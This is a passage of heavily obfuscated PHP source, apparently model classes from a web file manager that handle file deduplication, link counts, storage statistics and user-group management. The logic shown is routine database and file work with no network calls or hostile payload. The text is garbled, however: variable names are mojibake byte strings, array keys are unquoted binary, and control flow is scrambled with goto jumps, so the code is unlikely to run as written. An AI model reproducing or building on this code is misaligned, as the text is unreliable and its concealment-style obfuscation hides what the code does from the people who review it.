CacheLock::lock($bÂ¼ğÏÔÑØ); if ($dá¬Ğ“òø¬ = $this->addFileCheckExist($a­À÷áòÎ‰, $fÒ’¢÷±‹ğ, $c’ÂºÌéï)) { CacheLock::unlock($bÂ¼ğÏÔÑØ); return $dá¬Ğ“òø¬; } goto DÏ¬‚îšÂ; EÛŒĞ¹ ¬™: } public function addFileMake($f·ÌÚÌóŠÈ, $Eº´É¶, $e¥åÅ‚™, $dóÉïÙ÷ùç, $Cù¾—¿Î², $D½¿ÕÌ½ª÷) { goto FÔ›†³¤¨ª; A÷ğ˜ßˆìš: $fÌÁøÕÏá = KodIO::defaultDriver(); $a¾‰–—›¹ = array($F‹º‚‚Éİ[533] => $Eº´É¶, $F‹º‚‚Éİ[2154] => 1, $F‹º‚‚Éİ[397] => $Cù¾—¿Î², $F‹º‚‚Éİ[730] => $fÌÁøÕÏá[$F‹º‚‚Éİ[378]], $F‹º‚‚Éİ[398] => $A±˜Ó÷¡ì¯, $F‹º‚‚Éİ[2155] => $e¥åÅ‚™, $F‹º‚‚Éİ[2156] => $dóÉïÙ÷ùç); return $a¾‰–—›¹; goto Cà‡Ã­‘Ñõ; EéŠÕëé®´: $fß«ãÍ“‹ó = get_path_this($A±˜Ó÷¡ì¯); if ($D½¿ÕÌ½ª÷) { $Cç„Å¨÷—¼ = IO::move($f·ÌÚÌóŠÈ, $a¥»áÑÓ¥, !1, $fß«ãÍ“‹ó); } else { $Cç„Å¨÷—¼ = IO::copy($f·ÌÚÌóŠÈ, $a¥»áÑÓ¥, !1, $fß«ãÍ“‹ó); } if (!$Cç„Å¨÷—¼) { return !1; } goto A÷ğ˜ßˆìš; FÔ›†³¤¨ª: $F‹º‚‚Éİ =& $_SERVER[¹÷ˆ§éÒ°ú]; $A±˜Ó÷¡ì¯ = $this->createFileName($Cù¾—¿Î²); $a¥»áÑÓ¥ = get_path_father($A±˜Ó÷¡ì¯); goto EéŠÕëé®´; Cà‡Ã­‘Ñõ: } public function addFileCheckExist($añ«²êà©ƒ, $DãˆÓÈ£ƒ, $F‡ãÁŸ¶ã‰) { $b™‰ö„¥Òò =& $_SERVER[¹÷ˆ§éÒ°ú]; $Fåİ••…È× = $this->findByHash($añ«²êà©ƒ, $DãˆÓÈ£ƒ); if (!$Fåİ••…È×) { return !1; } $BÕŞËŒ¡• = array($b™‰ö„¥Òò[2154] => intval($Fåİ••…È×[$b™‰ö„¥Òò[2158]]) + 1, $b™‰ö„¥Òò[533] => $F‡ãÁŸ¶ã‰); $this->where(array($b™‰ö„¥Òò[431] => $Fåİ••…È×[$b™‰ö„¥Òò[430]]))->save($BÕŞËŒ¡•); return $Fåİ••…È×; } public function remove($aŒ’…È†¨‹) { $this->linkCountChange($aŒ’…È†¨‹, !1); $this->clearEmpty(); return !0; } public function linkAdd($aÅóùŞ°³) { $this->linkCountChange($aÅóùŞ°³, !0); } public function linkCountChange($f¤ÀÚåíÍì, $bÑŸ’ÒŠ…ò) { goto b©Íå™è†; FîÏ‘…‡ˆè: foreach ($F³ÙŸÃ‚®™ as $bª»¬·Öãƒ => $fÊåœ¶ÀÏƒ) { $BùÔ‰Ã½ë‰ = $fÊåœ¶ÀÏƒ . $F¡Ù¿´õ¨Û[43]; if (!$e×«ÍİµÂÍ[$BùÔ‰Ã½ë‰]) { $e×«ÍİµÂÍ[$BùÔ‰Ã½ë‰] = array(); } $e×«ÍİµÂÍ[$BùÔ‰Ã½ë‰][] = $bª»¬·Öãƒ; } foreach ($e×«ÍİµÂÍ as $fÊåœ¶ÀÏƒ => $EÎÒ’ĞŒåÕ) { if (!$EÎÒ’ĞŒåÕ) { continue; } $fÊåœ¶ÀÏƒ = $bÑŸ’ÒŠ…ò ? $fÊåœ¶ÀÏƒ : -intval($fÊåœ¶ÀÏƒ); $fŸÉ­·‡‰’ = array($F¡Ù¿´õ¨Û[430] => array($F¡Ù¿´õ¨Û[17], $EÎÒ’ĞŒåÕ)); if ($fÊåœ¶ÀÏƒ < 0) { $fŸÉ­·‡‰’[$F¡Ù¿´õ¨Û[2158]] = array($F¡Ù¿´õ¨Û[919], abs($fÊåœ¶ÀÏƒ)); } $this->where($fŸÉ­·‡‰’)->setAdd($F¡Ù¿´õ¨Û[2158], $fÊåœ¶ÀÏƒ); } goto e¤Ú»ğ¼·; Díõ­È‰è¿: $F³ÙŸÃ‚®™ = array(); foreach ($f¤ÀÚåíÍì as $bª»¬·Öãƒ) { $BùÔ‰Ã½ë‰ = $bª»¬·Öãƒ . $F¡Ù¿´õ¨Û[43]; if (!$F³ÙŸÃ‚®™[$BùÔ‰Ã½ë‰]) { $F³ÙŸÃ‚®™[$BùÔ‰Ã½ë‰] = 0; } $F³ÙŸÃ‚®™[$BùÔ‰Ã½ë‰]++; } $e×«ÍİµÂÍ = array(); goto FîÏ‘…‡ˆè; b©Íå™è†: $F¡Ù¿´õ¨Û =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$f¤ÀÚåíÍì) { return; } if (!is_array($f¤ÀÚåíÍì)) { $f¤ÀÚåíÍì = array($f¤ÀÚåíÍì); } goto Díõ­È‰è¿; e¤Ú»ğ¼·: } public function findByHash($EÜéœ”‘Œß, $C¥™Ê„ÍË = false) { $E×œ éŠŒ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$EÜéœ”‘Œß && !$C¥™Ê„ÍË) { return !1; } $BË¤Íø“§¨ = array($E×œ éŠŒ[2155] => $EÜéœ”‘Œß); if ($C¥™Ê„ÍË) { $BË¤Íø“§¨ = array($E×œ éŠŒ[2156] => $C¥™Ê„ÍË); } return $this->order($E×œ éŠŒ[2159])->where($BË¤Íø“§¨)->find(); } public function clearEmpty($FÂ×†äöƒ· = 0) { goto aëáŠØ¥; aëáŠØ¥: $EÈ˜Œ£Ê¢´ =& $_SERVER[¹÷ˆ§éÒ°ú]; $AŒ¸Ïïä† = time() - 3600 * 24 * $FÂ×†äöƒ·; $cÀÎíÙé©¿ = $EÈ˜Œ£Ê¢´[2160] . $AŒ¸Ïïä†; goto Aöõƒ¾±Êñ; Aù²Ó×®¹: foreach ($bÙ†°ßµ as $bšÙ®±„ø) { $CÚÑ‰œâ¦â->update(1); $this->resetFile($bšÙ®±„ø); } $CÚÑ‰œâ¦â->end(); goto D©Ë‘Ùªç; Aöõƒ¾±Êñ: $bÙ†°ßµ = $this->where($cÀÎíÙé©¿)->select(); if (!$bÙ†°ßµ) { return; } $CÚÑ‰œâ¦â = new Task($EÈ˜Œ£Ê¢´[2161], $EÈ˜Œ£Ê¢´[43], count($bÙ†°ßµ)); goto Aù²Ó×®¹; D©Ë‘Ùªç: } public function resetFile($Fù©¬©­­°) { goto b ÷ƒß´í; b ÷ƒß´í: $c¼Éª½‰à =& $_SERVER[¹÷ˆ§éÒ°ú]; $eéé’ö•Í = array($c¼Éª½‰à[431] => $Fù©¬©­­°[$c¼Éª½‰à[430]]); $CØéŒ¿‹Ğ‚ = Model($c¼Éª½‰à[1108])->where($eéé’ö•Í)->count(); goto B—¿¹ÀÏ; cÃ…šœÎ£: if ($Fù©¬©­­°[$c¼Éª½‰à[2158]] != $aõÇë²»ËÛ) { $this->where($eéé’ö•Í)->save(array($c¼Éª½‰à[2154] => $aõÇë²»ËÛ)); } goto Dœºê†ŠíŠ; B—¿¹ÀÏ: $Dí—ò‚¾ = Model($c¼Éª½‰à[2162])->where($eéé’ö•Í)->count(); $aõÇë²»ËÛ = intval($CØéŒ¿‹Ğ‚) + intval($Dí—ò‚¾); if ($aõÇë²»ËÛ == 0) { IO::remove($Fù©¬©­­°[$c¼Éª½‰à[87]]); $this->where($eéé’ö•Í)->delete(); $this->metaSet($Fù©¬©­­°[$c¼Éª½‰à[430]], null, null); return; } goto cÃ…šœÎ£; Dœºê†ŠíŠ: } public function storageInfo($DĞâœºğÀÓ = false) { goto c¾ëÌ»¨¬Á; d˜ææŞŒÄ: for ($D‡Œµâ—ğ = 0; $D‡Œµâ—ğ < $FŒ¤ŞäÇÚ´; $D‡Œµâ—ğ = $D‡Œµâ—ğ + $eŞ¶ª—‘œ) { $b¡‡ÔÇ… = $this->limit($D‡Œµâ—ğ, $D‡Œµâ—ğ + $eŞ¶ª—‘œ)->select(); foreach ($b¡‡ÔÇ… as $CÅåì„ †ë) { $Aä›ã÷æ– += $CÅåì„ †ë[$bÎ³Ë¨«ë[89]] * $CÅåì„ †ë[$bÎ³Ë¨«ë[2158]]; $Eˆãï ÅØ += $CÅåì„ †ë[$bÎ³Ë¨«ë[89]] * ($CÅåì„ †ë[$bÎ³Ë¨«ë[2158]] - 1); $dãÃËà¶Ú› += $CÅåì„ †ë[$bÎ³Ë¨«ë[2158]]; } } $D¼ÊïÓ = array($bÎ³Ë¨«ë[2163] => $Aä›ã÷æ–, $bÎ³Ë¨«ë[2164] => $Eˆãï ÅØ, $bÎ³Ë¨«ë[2165] => $Eˆãï ÅØ / $Aä›ã÷æ–, $bÎ³Ë¨«ë[93] => $FŒ¤ŞäÇÚ´, $bÎ³Ë¨«ë[2166] => $dãÃËà¶Ú›); return $D¼ÊïÓ; goto EÖŒ±ø¶£ò; AÍ†ˆ½‡í: $Aä›ã÷æ– = 1; $dãÃËà¶Ú› = 0; $eŞ¶ª—‘œ = 5000; goto d˜ææŞŒÄ; c¾ëÌ»¨¬Á: $bÎ³Ë¨«ë =& $_SERVER[¹÷ˆ§éÒ°ú]; $FŒ¤ŞäÇÚ´ = $this->count() + 0.0; $Eˆãï ÅØ = 0; goto AÍ†ˆ½‡í; EÖŒ±ø¶£ò: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\x75\x70"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\x61\155\x65" => "\x67\x72\x6f\165\160\137\155\145\164\141", "\x6d\145\x74\141\106\x69\x65\x6c\x64" => "\x67\x72\x6f\165\x70\111\x44"); protected function cacheFunctionAlias($AÙ°ÓÀƒÜä) { $eò¨İÀî°å =& $_SERVER[¹÷ˆ§éÒ°ú]; return array($eò¨İÀî°å[2167] => array($AÙ°ÓÀƒÜä[0], $eò¨İÀî°å[2168]), $eò¨İÀî°å[2169] => array($AÙ°ÓÀƒÜä[0], $eò¨İÀî°å[2168])); } protected function getInfo($b”›¶ÄŸ„Š) { $f “Ë¼‹ì = $this->getInfoSimple($b”›¶ÄŸ„Š); if (!$f “Ë¼‹ì) { return !1; } return $this->_listDataApplyItem($f “Ë¼‹ì); } protected function getInfoSimple($c– ¢³éİ¬, $aÄ­ãì“Ú = false) { $a”äİ±è·ò =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($aÄ­ãì“Ú) { $f’‡Š¶Áå = array($a”äİ±è·ò[2098] => intval($c– ¢³éİ¬)); $B­÷òÂ‰Õ— = $this->where($f’‡Š¶Áå)->find(); return is_array($B­÷òÂ‰Õ—) ? $B­÷òÂ‰Õ— : array(); } return $this->cacheFunctionGet($a”äİ±è·ò[2170], $c– ¢³éİ¬); } protected function groupAdd($dØ‚×Á½Ó) { goto b¦Á³¿¯ïã; F›Ë™°ô±œ: if (!empty($dØ‚×Á½Ó[$B»†Ëõ[2098]])) { $Aâ…Ã®Ã–[$B»†Ëõ[2098]] = $dØ‚×Á½Ó[$B»†Ëõ[2098]]; } $dÓ‰æÃ¸—â = $this->add($Aâ…Ã®Ã–); $this->setNamePinyin($dÓ‰æÃ¸—â, $Aâ…Ã®Ã–[$B»†Ëõ[38]]); goto eÏº‰ïÙ³ª; b¦Á³¿¯ïã: $B»†Ëõ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$dØ‚×Á½Ó[$B»†Ëõ[474]] && isset($dØ‚×Á½Ó[$B»†Ëõ[2098]]) && $dØ‚×Á½Ó[$B»†Ëõ[2098]] == 1) { if ($c•´Õ¼‘× = $this->getInfoSimple($dØ‚×Á½Ó[$B»†Ëõ[2098]], !0)) { return $dØ‚×Á½Ó[$B»†Ëõ[2098]]; } } else { $c•´Õ¼‘× = $this->getInfoSimple($dØ‚×Á½Ó[$B»†Ëõ[474]]); if (!$c•´Õ¼‘×) { return !1; } } $D²ÃŞîÓ•» = $B»†Ëõ[483]; goto B¬¶íÂ®óí; eÏº‰ïÙ³ª: if (isset($dØ‚×Á½Ó[$B»†Ëõ[2173]])) { $this->metaSet($dÓ‰æÃ¸—â, array($B»†Ëõ[2173] => $dØ‚×Á½Ó[$B»†Ëõ[2173]], $B»†Ëõ[2174] => $dØ‚×Á½Ó[$B»†Ëõ[2174]])); unset($dØ‚×Á½Ó[$B»†Ëõ[2173]]); unset($dØ‚×Á½Ó[$B»†Ëõ[2174]]); } Model($B»†Ëõ[1108])->groupRootAdd($dÓ‰æÃ¸—â); return $dÓ‰æÃ¸—â; goto E›ñÎÖ»¹; B¬¶íÂ®óí: if ($c•´Õ¼‘×[$B»†Ëõ[472]]) { $D²ÃŞîÓ•» = $c•´Õ¼‘×[$B»†Ëõ[472]] . $c•´Õ¼‘×[$B»†Ëõ[2098]] . $B»†Ëõ[57]; } $Aâ…Ã®Ã– = array($B»†Ëõ[397] => $this->groupNameAuto($dØ‚×Á½Ó[$B»†Ëõ[474]], $dØ‚×Á½Ó[$B»†Ëõ[38]]), $B»†Ëõ[379] => $dØ‚×Á½Ó[$B»†Ëõ[474]], $B»†Ëõ[538] => $D²ÃŞîÓ•», $B»†Ëõ[2171] => $dØ‚×Á½Ó[$B»†Ëõ[2082]], $B»†Ëõ[2172] => 0, $B»†Ëõ[2102] => 0); if (isset($dØ‚×Á½Ó[$B»†Ëõ[2119]])) { $Aâ…Ã®Ã–[$B»†Ëõ[2119]] = $dØ‚×Á½Ó[$B»†Ëõ[2119]]; } else { $aËóãÑàö³ = $this->max($B»†Ëõ[2119]); if (!$aËóãÑàö³) { $aËóãÑàö³ = 0; } $Aâ…Ã®Ã–[$B»†Ëõ[2119]] = $aËóãÑàö³ + 1; } goto F›Ë™°ô±œ; E›ñÎÖ»¹: } protected function groupEdit($a¶‘Ö‡‰¾—, $Aª¡§ë£öŸ) { $Dè¬øËÈ« =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!empty($Aª¡§ë£öŸ[$Dè¬øËÈ«[474]])) { $dÀÚ¤äŸ¾í = $this->getInfoSimple($a¶‘Ö‡‰¾—); $CğöŸŒ…°– = $this->getInfoSimple($Aª¡§ë£öŸ[$Dè¬øËÈ«[474]]); if (!$dÀÚ¤äŸ¾í || !$CğöŸŒ…°–) { return !1; } if ($dÀÚ¤äŸ¾í[$Dè¬øËÈ«[2098]] == $CğöŸŒ…°–[$Dè¬øËÈ«[2098]]) { return !1; } if ($Aª¡§ë£öŸ[$Dè¬øËÈ«[474]] != $dÀÚ¤äŸ¾í[$Dè¬øËÈ«[474]]) { if ($CğöŸŒ…°–[$Dè¬øËÈ«[472]] !== $dÀÚ¤äŸ¾í[$Dè¬øËÈ«[472]] && strpos($CğöŸŒ…°–[$Dè¬øËÈ«[472]], $dÀÚ¤äŸ¾í[$Dè¬øËÈ«[472]] . $dÀÚ¤äŸ¾í[$Dè¬øËÈ«[2098]] . $Dè¬øËÈ«[57]) === 0) { return !1; } $Aª¡§ë£öŸ[$Dè¬øËÈ«[538]] = $CğöŸŒ…°–[$Dè¬øËÈ«[472]] . $Aª¡§ë£öŸ[$Dè¬øËÈ«[474]] . $Dè¬øËÈ«[57]; $this->_changeChildLevel($dÀÚ¤äŸ¾í, $CğöŸŒ…°–); } } if (isset($Aª¡§ë£öŸ[$Dè¬øËÈ«[38]])) { $this->setNamePinyin($a¶‘Ö‡‰¾—, $Aª¡§ë£öŸ[$Dè¬øËÈ«[38]]); } if (isset($Aª¡§ë£öŸ[$Dè¬øËÈ«[2173]])) { $this->metaSet($a¶‘Ö‡‰¾—, array($Dè¬øËÈ«[2173] => $Aª¡§ë£öŸ[$Dè¬øËÈ«[2173]], $Dè¬øËÈ«[2174] => $Aª¡§ë£öŸ[$Dè¬øËÈ«[2174]])); unset($Aª¡§ë£öŸ[$Dè¬øËÈ«[2173]]); unset($Aª¡§ë£öŸ[$Dè¬øËÈ«[2174]]); } return $this->where(array($Dè¬øËÈ«[2175] => $a¶‘Ö‡‰¾—))->save($Aª¡§ë£öŸ); } private function _changeChildLevel($c‡‡´”¨¢¿, $b–³ÍŒ£ß÷, $B‚ÒÊ¼“× = false) { goto dÉÎæ¿Œ«Ì; b¯Íèê‰ù¢: $this->where($D“¨¢ø…á )->data($CÓŒÍš›—)->save(); goto AĞ¼ÎŞÇ”; EÀó›Ïäíˆ: if ($B‚ÒÊ¼“×) { $D²Á”ÈË²‰ = $b–³ÍŒ£ß÷[$F‹¶İ›¬ÙÄ[472]] . $b–³ÍŒ£ß÷[$F‹¶İ›¬ÙÄ[2098]] . $F‹¶İ›¬ÙÄ[57]; } $D“¨¢ø…á  = array($F‹¶İ›¬ÙÄ[538] => array($F‹¶İ›¬ÙÄ[496], $c‡‡´”¨¢¿[$F‹¶İ›¬ÙÄ[472]] . $c‡‡´”¨¢¿[$F‹¶İ›¬ÙÄ[2098]] . $F‹¶İ›¬ÙÄ[497])); $CÓŒÍš›— = array($F‹¶İ›¬ÙÄ[538] => array($F‹¶İ›¬ÙÄ[547], "\x72\x65\x70\x6c\x61\143\x65\50\x70\141\x72\x65\x6e\164\x4c\x65\166\145\154\x2c\47{$e ÈõÊ¨ÍÉ}\x27\54\47{$D²Á”ÈË²‰}\47\x29")); goto b¯Íèê‰ù¢; dÉÎæ¿Œ«Ì: $F‹¶İ›¬ÙÄ =& $_SERVER[¹÷ˆ§éÒ°ú]; $e ÈõÊ¨ÍÉ = $c‡‡´”¨¢¿[$F‹¶İ›¬ÙÄ[472]] . $c‡‡´”¨¢¿[$F‹¶İ›¬ÙÄ[2098]] . $F‹¶İ›¬ÙÄ[57]; $D²Á”ÈË²‰ = $b–³ÍŒ£ß÷[$F‹¶İ›¬ÙÄ[472]] . $b–³ÍŒ£ß÷[$F‹¶İ›¬ÙÄ[2098]] . $F‹¶İ›¬ÙÄ[57] . $c‡‡´”¨¢¿[$F‹¶İ›¬ÙÄ[2098]] . $F‹¶İ›¬ÙÄ[57]; goto EÀó›Ïäíˆ; AĞ¼ÎŞÇ”: } public function setNamePinyin($C‰»°¤¢“¥, $Fºß‹×ìŠ = false) { $DË•ÊŒæÎÕ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$Fºß‹×ìŠ) { $Cõ¬â’¦†ñ = $this->getInfoSimple($C‰»°¤¢“¥); $Fºß‹×ìŠ = $Cõ¬â’¦†ñ[$DË•ÊŒæÎÕ[38]]; } if (!Input::check($Fºß‹×ìŠ, $DË•ÊŒæÎÕ[541])) { $this->metaSet($C‰»°¤¢“¥, $DË•ÊŒæÎÕ[427], null); $this->metaSet($C‰»°¤¢“¥, $DË•ÊŒæÎÕ[426], null); return; } $cƒ‘Ò’­² = array($DË•ÊŒæÎÕ[427] => str_replace($DË•ÊŒæÎÕ[60], $DË•ÊŒæÎÕ[43], Pinyin::encode($Fºß‹×ìŠ)), $DË•ÊŒæÎÕ[426] => Pinyin::encode($Fºß‹×ìŠ, $DË•ÊŒæÎÕ[542])); $this->metaSet($C‰»°¤¢“¥, $cƒ‘Ò’­²); } protected function groupStatus($FÆåßŞÕ‰÷, $A’”òÌ‘Ó¥) { goto FºµÖ˜¥èİ; CåÂÚñ‡‘ò: foreach ($BÎÙéõ¢åö as $FÆåßŞÕ‰÷) { $DÁåœº¾¶²[] = array($e‚ŸšÄòÅ[2098] => $FÆåßŞÕ‰÷, $e‚ŸšÄòÅ[101] => $e‚ŸšÄòÅ[684], $e‚ŸšÄòÅ[370] => $A’”òÌ‘Ó¥); } return Model($e‚ŸšÄòÅ[2176])->addAll($DÁåœº¾¶², array(), !0); goto B·äíÈŠ¡¥; FºµÖ˜¥èİ: $e‚ŸšÄòÅ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C©”ÖÕ½° = $this->getInfoSimple($FÆåßŞÕ‰÷); if (!$C©”ÖÕ½°) { return !1; } goto D™µµÉÇŒÖ; D™µµÉÇŒÖ: if ($A’”òÌ‘Ó¥ == $e‚ŸšÄòÅ[95]) { $BÎÙéõ¢åö = $this->parentLevelArray($C©”ÖÕ½°[$e‚ŸšÄòÅ[472]]); } else { $bëÜ…™ºäË = array($e‚ŸšÄòÅ[538] => array($e‚ŸšÄòÅ[496], $C©”ÖÕ½°[$e‚ŸšÄòÅ[472]] . $C©”ÖÕ½°[$e‚ŸšÄòÅ[2098]] . $e‚ŸšÄòÅ[497])); $BÎÙéõ¢åö = $this->where($bëÜ…™ºäË)->field($e‚ŸšÄòÅ[2098])->select(); $BÎÙéõ¢åö = array_to_keyvalue($BÎÙéõ¢åö, $e‚ŸšÄòÅ[43], $e‚ŸšÄòÅ[2098]); } $BÎÙéõ¢åö[] = $C©”ÖÕ½°[$e‚ŸšÄòÅ[2098]]; $DÁåœº¾¶² = array(); goto CåÂÚñ‡‘ò; B·äíÈŠ¡¥: } protected function groupRemove($eİÕóäîê) { goto eÍååáä»; Aä÷™ã‚½…: Model($böİó¢¸×Æ[747])->groupRootRemove($eİÕóäîê); return $this->where($d¶”Í½¥Ò¿)->delete(); goto D—ÇÊ©Æíö; E§ÄŸ°ØÍÙ: $this->where(array($böİó¢¸×Æ[474] => $eİÕóäîê))->save(array($böİó¢¸×Æ[474] => $bîö«ôÙ¨[$böİó¢¸×Æ[474]])); Model($böİó¢¸×Æ[2176])->where($d¶”Í½¥Ò¿)->delete(); Model($böİó¢¸×Æ[2177])->where($d¶”Í½¥Ò¿)->delete(); goto Aä÷™ã‚½…; F½Åøí˜—: if (!$bîö«ôÙ¨ || $bîö«ôÙ¨[$böİó¢¸×Æ[474]] == 0) { return !1; } $FŠßáŒˆìœ = $this->getInfoSimple($bîö«ôÙ¨[$böİó¢¸×Æ[474]]); $this->_changeChildLevel($bîö«ôÙ¨, $FŠßáŒˆìœ, !0); goto E§ÄŸ°ØÍÙ; eÍååáä»: $böİó¢¸×Æ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d¶”Í½¥Ò¿ = array($böİó¢¸×Æ[2098] => $eİÕóäîê); $bîö«ôÙ¨ = $this->where($d¶”Í½¥Ò¿)->find(); goto F½Åøí˜—; D—ÇÊ©Æíö: } protected function groupSort($BØİëÉ×§ô) { $D´Îƒ·í«‹ =& $_SERVER[¹÷ˆ§éÒ°ú]; $bÌƒèšÛ»Ü = array(); foreach ($BØİëÉ×§ô as $D²Ï©…º‰÷ => $bçğë…Îí¶) { $bÌƒèšÛ»Ü[] = array($D´Îƒ·í«‹[2098], $bçğë…Îí¶, $D´Îƒ·í«‹[2119], $D²Ï©…º‰÷ + 1); } $this->saveAll($bÌƒèšÛ»Ü); } public function listData() { $D‚µä£°£ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($D‚µä£°£[$_SERVER[¹÷ˆ§éÒ°ú][365]]); return $D‚µä£°£; } private function _makeOrder($B¤‹ß‚·‡† = '') { goto bÉÃÙÆóö; AÀÇŸºº…: $fÖàõ«îÖĞ = Input::get($E¥–ä×Â¸†[418], $E¥–ä×Â¸†[17], $E¥–ä×Â¸†[2102], $bï“Ã÷İ¾Ñ); $c°òÖ›ÁØì = Input::get($E¥–ä×Â¸†[419], $E¥–ä×Â¸†[17], $E¥–ä×Â¸†[2178], array($E¥–ä×Â¸†[2178], $E¥–ä×Â¸†[415])); $c°òÖ›ÁØì = $C„½øœö¬Â[$c°òÖ›ÁØì]; goto Cğ¸·¡çù; bÉÃÙÆóö: $E¥–ä×Â¸† =& $_SERVER[¹÷ˆ§éÒ°ú]; $bï“Ã÷İ¾Ñ = array($E¥–ä×Â¸†[2098], $E¥–ä×Â¸†[38], $E¥–ä×Â¸†[2084], $E¥–ä×Â¸†[199]); $C„½øœö¬Â = array($E¥–ä×Â¸†[413] => $E¥–ä×Â¸†[414], $E¥–ä×Â¸†[415] => $E¥–ä×Â¸†[416]); goto AÀÇŸºº…; Cğ¸·¡çù: $B¤‹ß‚·‡† = $B¤‹ß‚·‡† . "{$fÖàõ«îÖĞ}\40{$c°òÖ›ÁØì}\54\40\147\x72\x6f\165\160\111\104\40\x61\x73\143"; return $this->order($B¤‹ß‚·‡†); goto Dß“†Ã‰àÅ; Dß“†Ã‰àÅ: } public function listChild($f‘Ì½ĞµÆ) { $aÂœ¯Ğ‚”ñ =& $_SERVER[¹÷ˆ§éÒ°ú]; $f ³öçÙê¡ = $this->where(array($aÂœ¯Ğ‚”ñ[474] => $f‘Ì½ĞµÆ))->_makeOrder()->selectPage(200); $this->_listDataApply($f ³öçÙê¡[$aÂœ¯Ğ‚”ñ[365]]); return $f ³öçÙê¡; } public function listByID($eÑ³ÈÖÇõŠ) { $C‚×„ØÖÅÌ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$eÑ³ÈÖÇõŠ) { return array(); } $E‘ä¨º”÷Ú = array($C‚×„ØÖÅÌ[2098] => array($C‚×„ØÖÅÌ[17], $eÑ³ÈÖÇõŠ)); $e¨ßÃ¯ìİˆ = $this->where($E‘ä¨º”÷Ú)->select(); $this->_listDataApply($e¨ßÃ¯ìİˆ); return $e¨ßÃ¯ìİˆ; } public function listSearch($cè’á±§×Ú) { goto Dˆ‘…ò¾³; A®‘Áâ¨í¼: if (!$b©Úë·¹ò || count($b©Úë·¹ò[$Aá›Ú¤¼´º[365]]) < 5 && Input::check($bÔä—¿¢¤, $Aá›Ú¤¼´º[317])) { goto DÍö«ÉˆÈ©; cãÄĞŸ¨¬˜: $b©Úë·¹ò[$Aá›Ú¤¼´º[362]][$Aá›Ú¤¼´º[364]] = ceil($b©Úë·¹ò[$Aá›Ú¤¼´º[362]][$Aá›Ú¤¼´º[363]] / $b©Úë·¹ò[$Aá›Ú¤¼´º[362]][$Aá›Ú¤¼´º[360]]); goto fÀé‘š÷ò½; DÍö«ÉˆÈ©: $Dø¹Ä×ôÔÉ = $this->groupChildrenAll($B°ÚÆ³­Ô); $FíÖ—¼ššÆ = $this->_searchFromMeta($Aá›Ú¤¼´º[426], $bÔä—¿¢¤, 10, $Dø¹Ä×ôÔÉ); $eÌºøæ²×ô = $this->_searchFromMeta($Aá›Ú¤¼´º[427], $bÔä—¿¢¤, 10, $Dø¹Ä×ôÔÉ); goto fÔ†ä¸ôîÇ; fÔ†ä¸ôîÇ: $E¦³‰¦÷Õğ = array_merge($FíÖ—¼ššÆ, $eÌºøæ²×ô, $b©Úë·¹ò[$Aá›Ú¤¼´º[365]]); $b©Úë·¹ò[$Aá›Ú¤¼´º[365]] = array_unique_by_key($E¦³‰¦÷Õğ, $Aá›Ú¤¼´º[2098]); $b©Úë·¹ò[$Aá›Ú¤¼´º[362]][$Aá›Ú¤¼´º[363]] = count($b©Úë·¹ò[$Aá›Ú¤¼´º[365]]); goto cãÄĞŸ¨¬˜; fÀé‘š÷ò½: } $this->_listDataApply($b©Úë·¹ò[$Aá›Ú¤¼´º[365]]); return $b©Úë·¹ò; goto bËÍ‰‰¾Ä¦; FÔ“…ĞÑ: if ($B°ÚÆ³­Ô) { $d±àµ“Ç•Œ = $this->getInfoSimple($B°ÚÆ³­Ô); $EêÕ‰‰‰æ = $d±àµ“Ç•Œ[$Aá›Ú¤¼´º[472]] . $B°ÚÆ³­Ô . $Aá›Ú¤¼´º[497]; $F˜°°™¶ñ¹ = array($F˜°°™¶ñ¹, array($Aá›Ú¤¼´º[472] => array($Aá›Ú¤¼´º[746], $EêÕ‰‰‰æ))); } $b©Úë·¹ò = $this->_makeOrder()->where($F˜°°™¶ñ¹)->selectPage(20); $b©Úë·¹ò = $b©Úë·¹ò ? $b©Úë·¹ò : array(); goto A®‘Áâ¨í¼; eè¦Ê²ŸêÉ: if (!trim($bÔä—¿¢¤)) { return !1; } $bÔä—¿¢¤ = str_replace($Aá›Ú¤¼´º[2181], $Aá›Ú¤¼´º[2182], $bÔä—¿¢¤); $F˜°°™¶ñ¹ = array($Aá›Ú¤¼´º[2098] => array($Aá›Ú¤¼´º[746], "\x25{$bÔä—¿¢¤}\45"), $Aá›Ú¤¼´º[38] => array($Aá›Ú¤¼´º[746], "\45{$bÔä—¿¢¤}\45"), $Aá›Ú¤¼´º[904] => $Aá›Ú¤¼´º[2183]); goto FÔ“…ĞÑ; Dˆ‘…ò¾³: $Aá›Ú¤¼´º =& $_SERVER[¹÷ˆ§éÒ°ú]; $bÔä—¿¢¤ = $cè’á±§×Ú[$Aá›Ú¤¼´º[2179]]; $B°ÚÆ³­Ô = isset($cè’á±§×Ú[$Aá›Ú¤¼´º[2180]]) ? $cè’á±§×Ú[$Aá›Ú¤¼´º[2180]] : !1; goto eè¦Ê²ŸêÉ; bËÍ‰‰¾Ä¦: } protected function groupChildrenAll($FÜ›ÀÈ¾˜É) { $AŒêÆè½È =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$FÜ›ÀÈ¾˜É) { return !1; } if (is_string($FÜ›ÀÈ¾˜É)) { $FÜ›ÀÈ¾˜É = array($FÜ›ÀÈ¾˜É); } $bğà”ÔèË = $FÜ›ÀÈ¾˜É; foreach ($FÜ›ÀÈ¾˜É as $E…ãÇíÙ¡í) { $a®×¬‡¬—¼ = $this->getInfoSimple($E…ãÇíÙ¡í); $bÀê³¼ÉÁÙ = array($AŒêÆè½È[472] => array($AŒêÆè½È[746], $a®×¬‡¬—¼[$AŒêÆè½È[472]] . $E…ãÇíÙ¡í . $AŒêÆè½È[497])); $DÄ¤—²Œº = $this->field($AŒêÆè½È[2098])->where($bÀê³¼ÉÁÙ)->select(); $bğà”ÔèË = array_merge($bğà”ÔèË, array_to_keyvalue($DÄ¤—²Œº, $AŒêÆè½È[43], $AŒêÆè½È[2098])); } return array_unique($bğà”ÔèË); } private function _searchFromMeta($b¸õìó¦, 